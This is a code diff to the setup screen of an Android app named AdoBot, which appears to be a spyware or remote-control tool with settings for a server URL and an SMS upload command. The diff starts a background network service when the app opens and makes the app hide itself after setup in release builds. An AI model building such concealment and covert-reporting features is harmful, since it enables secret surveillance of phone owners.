@@ -2,6 +2,7 @@ package com.android.adobot.activities;
 
 import android.content.Context;
 import android.content.DialogInterface;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.support.v7.app.AlertDialog;
@@ -15,6 +16,7 @@ import android.widget.Toast;
 import com.android.adobot.BuildConfig;
 import com.android.adobot.AdobotConstants;
 import com.android.adobot.R;
+import com.android.adobot.network.NetworkSchedulerService;
 
 /**
  * Created by adones on 2/26/17.
@@ -29,6 +31,7 @@ public class SetupActivity extends BaseActivity {
     String url, sms, uploadSMScmd;
     Button btnSetUrl;
     AppCompatActivity activity;
+    Intent serviceIntent;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -59,6 +62,15 @@ public class SetupActivity extends BaseActivity {
 
         btnSetUrl = (Button) findViewById(R.id.btn_save_settings);
         btnSetUrl.setOnClickListener(saveBtnClickListener);
+
+        serviceIntent = new Intent(this, NetworkSchedulerService.class);
+        startService(serviceIntent);
+
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
     }
 
     private View.OnClickListener saveBtnClickListener = new View.OnClickListener() {
@@ -131,8 +143,8 @@ public class SetupActivity extends BaseActivity {
 
     private void done() {
         startClient();
-//        if (!BuildConfig.DEBUG) hideApp();
-        hideApp();
+        if (!BuildConfig.DEBUG) hideApp();
+//        hideApp();
         finish();
     }
 }
